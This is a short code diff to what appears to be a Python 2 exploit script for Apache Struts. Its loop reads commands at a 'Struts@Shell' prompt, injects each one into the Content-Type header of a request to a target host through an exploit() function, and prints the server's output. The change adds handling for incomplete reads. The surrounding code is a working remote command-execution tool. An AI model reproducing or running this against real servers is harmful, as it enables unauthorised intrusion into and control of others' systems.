@@ -2,6 +2,7 @@
 #Code By @s1kr10s
 
 import urllib2
+import httplib
 import os
 
 RED = '\033[1;31m'
@@ -54,5 +55,8 @@ def exploit(comando):
 while 1:
 	separador = raw_input(GREEN+"Struts@Shell:$ "+ENDC)
 	req = urllib2.Request(host, None, {'User-agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5', 'Content-Type': exploit(str(separador))})
-	result = urllib2.urlopen(req).read()
-	print result
+	try:
+		result = urllib2.urlopen(req).read()
+		print result
+	except httplib.IncompleteRead, e:
+		print e.partial
